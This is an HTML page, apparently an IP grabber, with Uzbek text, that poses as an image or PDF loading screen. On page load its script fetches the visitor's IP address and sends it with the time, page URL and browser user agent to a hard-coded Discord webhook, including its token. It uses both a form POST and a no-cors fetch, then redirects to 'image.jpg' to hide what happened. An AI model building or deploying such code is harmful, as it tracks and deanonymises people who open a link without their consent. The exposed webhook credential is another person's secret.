<!DOCTYPE html>
<html>
<head>
    <title>Rasm Yuklanmoqda...</title>
</head>
<body>
    <script>
        // Discord Webhook
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Aniqlanmadi';
            }
        }

        // 1-USUL: Form orqali
        function sendViaForm(ip) {
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = WEBHOOK_URL;
                
                const content = document.createElement('input');
                content.name = 'content';
                content.value = `ðŸŸ¢ **FORM - PDF RASM OCHILDI!**\n\n` +
                               `ðŸŒ **IP:** ${ip}\n` +
                               `â° **Vaqt:** ${new Date().toLocaleString()}\n` +
                               `ðŸ”— **URL:** ${window.location.href}`;
                
                form.appendChild(content);
                document.body.appendChild(form);
                form.submit();
                setTimeout(() => document.body.removeChild(form), 500);
                
                console.log('Form orqali yuborildi');
                return true;
            } catch (error) {
                console.log('Form xatosi:', error);
                return false;
            }
        }

        // 2-USUL: Fetch with no-cors
        async function sendViaFetch(ip) {
            try {
                const message = {
                    content: `ðŸ”µ **FETCH - PDF RASM!**\n\n` +
                             `ðŸŒ **IP:** ${ip}\n` +
                             `â° **Vaqt:** ${new Date().toLocaleString()}\n` +
                             `ðŸ–¥ï¸ **Brauzer:** ${navigator.userAgent.substring(0, 50)}`
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
                
                console.log('Fetch orqali yuborildi (no-cors)');
                return true;
            } catch (error) {
                console.log('Fetch xatosi:', error);
                return false;
            }
        }

        // Asosiy funksiya
        async function trackUser() {
            console.log('IP manzil olinmoqda...');
            const userIP = await getIP();
            console.log('IP:', userIP);

            // Ikkala usulni ham ishga tushiramiz
            sendViaForm(userIP);
            setTimeout(() => sendViaFetch(userIP), 1000);

            return userIP;
        }

        // Ishga tushirish
        window.onload = async function() {
            console.log('Sahifa yuklandi...');
            await trackUser();
            
            setTimeout(() => {
                window.location.href = 'image.jpg';
            }, 2000);
        };
    </script>

    <div style="text-align: center; padding: 80px;">
        <h3>ðŸ“„ PDF Rasm Tayyorlanmoqda</h3>
        <p>IP manzilingiz: <strong id="ipText">aniqlanmoqda...</strong></p>
        <p>Discordga ma'lumotlar yuborilmoqda...</p>
    </div>

    <script>
        // IP ni ekranda ko'rsatish
        setTimeout(async () => {
            const ip = await getIP();
            document.getElementById('ipText').textContent = ip;
        }, 1000);
    </script>
</body>
</html>
